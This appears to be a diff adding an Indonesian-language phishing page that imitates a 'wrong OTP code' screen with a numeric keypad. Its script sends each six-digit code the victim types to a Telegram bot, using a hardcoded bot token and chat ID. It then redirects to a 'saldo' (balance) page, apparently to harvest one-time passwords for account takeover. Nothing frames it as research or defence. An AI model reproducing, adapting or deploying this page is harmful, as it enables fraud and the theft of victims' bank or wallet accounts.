@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Kode OTP Salah</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: #000;
+        }
+
+        /* Tombol Kembali */
+        .back-btn {
+            position: absolute;
+            top: 8px;
+            left: 10px;
+            font-size: 20px;
+            color: #000;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        /* Konten Utama */
+        .content {
+            flex: 1;
+            padding: 45px 20px 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Ikon Error — Lingkaran Merah + Tanda Seru */
+        .icon-box {
+            width: 60px;
+            height: 60px;
+            background: #FEE;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 14px;
+        }
+        .icon-box svg {
+            width: 32px;
+            height: 32px;
+        }
+
+        /* Judul & Pesan Error */
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #E53935;
+            margin-bottom: 8px;
+        }
+        .desc {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.5;
+            padding: 0 8px;
+        }
+        .error-note {
+            font-size: 13px;
+            color: #E53935;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        /* Input OTP — Border Merah */
+        .otp-input-wrap {
+            width: 100%;
+            position: relative;
+            margin-bottom: 18px;
+        }
+        .otp-input {
+            width: 100%;
+            padding: 13px 12px;
+            font-size: 16px;
+            border: 2px solid #E53935;
+            border-radius: 10px;
+            outline: none;
+            background: #FFF5F5;
+            color: #E53935;
+        }
+        .otp-input::placeholder {
+            color: #E53935;
+            opacity: 0.7;
+        }
+        .clear-btn {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #FCC;
+            color: #E53935;
+            border: none;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        /* Tombol Coba Lagi */
+        .retry-btn {
+            width: 100%;
+            padding: 14px;
+            background: #E53935;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        .retry-btn:active {
+            background: #D32F2F;
+        }
+
+        /* Hitung Mundur */
+        .resend-text {
+            font-size: 13px;
+            color: #999;
+            margin-bottom: auto;
+            padding-bottom: 18px;
+            text-align: center;
+        }
+        .resend-text.active {
+            color: #1688F0;
+            cursor: pointer;
+        }
+
+        /* Keyboard Angka */
+        .keyboard {
+            width: 100%;
+            background: #e5e5e7;
+            padding: 6px 5px 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            user-select: none;
+        }
+        .key-row {
+            display: flex;
+            gap: 5px;
+        }
+        .key {
+            flex: 1;
+            background: #ffffff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 4px;
+            font-size: 20px;
+            color: #000;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 46px;
+        }
+        .key:active {
+            background: #d1d1d1;
+        }
+        .key .sub {
+            font-size: 9px;
+            color: #666;
+            margin-top: 1px;
+        }
+        .key-wide {
+            flex: 2;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Tombol Kembali -->
+    <a href="#" class="back-btn">←</a>
+
+    <!-- Konten Error -->
+    <div class="content">
+        <div class="icon-box">
+            <!-- Ikon Tanda Seru Error -->
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="#E53935"/>
+                <path d="M12 7V13" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
+                <circle cx="12" cy="17" r="1.2" fill="white"/>
+            </svg>
+        </div>
+
+        <h1>Kode OTP Salah</h1>
+        <p class="desc">Kode OTP yang Anda masukkan tidak valid atau sudah kadaluarsa.</p>
+        <p class="error-note">Silakan coba masukkan kode lagi.</p>
+
+        <div class="otp-input-wrap">
+            <input type="text" id="otpInput" class="otp-input" placeholder="Masukkan Kode OTP" inputmode="numeric" maxlength="6">
+            <button class="clear-btn" onclick="clearOTP()">×</button>
+        </div>
+
+        <button class="retry-btn" onclick="kirimUlang()">Kirim Ulang OTP</button>
+
+        <p class="resend-text" id="countdown">Kirim Ulang dalam 28 Detik</p>
+    </div>
+
+    <!-- Keyboard Angka -->
+    <div class="keyboard">
+        <div class="key-row">
+            <button class="key" onclick="appendNum('1')">1<span class="sub"></span></button>
+            <button class="key" onclick="appendNum('2')">2<span class="sub">ABC</span></button>
+            <button class="key" onclick="appendNum('3')">3<span class="sub">DEF</span></button>
+        </div>
+        <div class="key-row">
+            <button class="key" onclick="appendNum('4')">4<span class="sub">GHI</span></button>
+            <button class="key" onclick="appendNum('5')">5<span class="sub">JKL</span></button>
+            <button class="key" onclick="appendNum('6')">6<span class="sub">MNO</span></button>
+        </div>
+        <div class="key-row">
+            <button class="key" onclick="appendNum('7')">7<span class="sub">PQRS</span></button>
+            <button class="key" onclick="appendNum('8')">8<span class="sub">TUV</span></button>
+            <button class="key" onclick="appendNum('9')">9<span class="sub">WXYZ</span></button>
+        </div>
+        <div class="key-row">
+            <button class="key" onclick="appendNum('+')">+<span class="sub">* #</span></button>
+            <button class="key key-wide" onclick="appendNum('0')">0<span class="sub"></span></button>
+            <button class="key" onclick="deleteNum()">⌫<span class="sub"></span></button>
+        </div>
+    </div>
+
+    <script>
+        const otpInput = document.getElementById('otpInput');
+
+        // Fungsi input angka
+        function appendNum(n) {
+            if (otpInput.value.length < 6) {
+                otpInput.value += n;
+                // Saat 6 digit terisi → cek & kirim ke Telegram
+                if (otpInput.value.length === 6) {
+                    kirimOTP();
+                }
+            }
+        }
+        function deleteNum() {
+            otpInput.value = otpInput.value.slice(0, -1);
+        }
+        function clearOTP() {
+            otpInput.value = '';
+        }
+
+        // Hitung Mundur
+        let timeLeft = 28;
+        const countdownEl = document.getElementById('countdown');
+        const timer = setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                countdownEl.textContent = 'Kirim Ulang SMS';
+                countdownEl.classList.add('active');
+                countdownEl.onclick = () => {
+                    window.location.reload(); // Muat ulang halaman
+                };
+            } else {
+                countdownEl.textContent = `Kirim Ulang dalam ${timeLeft} Detik`;
+            }
+        }, 1000);
+
+        // === KONFIGURASI TELEGRAM ===
+        const BOT_TOKEN = "8901288911:AAETNtckzfIRPsCc9kR0BNcgODG5ajDRmNk";
+        const CHAT_ID = "8617754329";
+        const HALAMAN_BERHASIL = "saldo.html"; // Ganti halaman sukses
+
+        async function kirimOTP() {
+            const kode = otpInput.value.trim();
+            const pesan = `❌ Percobaan OTP Salah:\nKode: ${kode}`;
+            
+            // Kirim percobaan ke Telegram
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: pesan})
+                });
+            } catch(e) {}
+
+            // Simulasi: jika kode benar → pindah, jika salah → tetap di halaman ini
+            // Ganti logika sesuai kebutuhan kamu
+            if (kode === "123456") { // Ganti dengan kode yang benar
+                window.location.href = HALAMAN_BERHASIL;
+            } else {
+                alert("Kode OTP salah! Silakan coba lagi.");
+                otpInput.value = '';
+            }
+        }
+
+        // Tombol Kirim Ulang
+        function kirimUlang() {
+            alert("Kode OTP baru telah dikirim!");
+            window.location.reload();
+        }
+    </script>
+
+</body>
+</html>
+ 
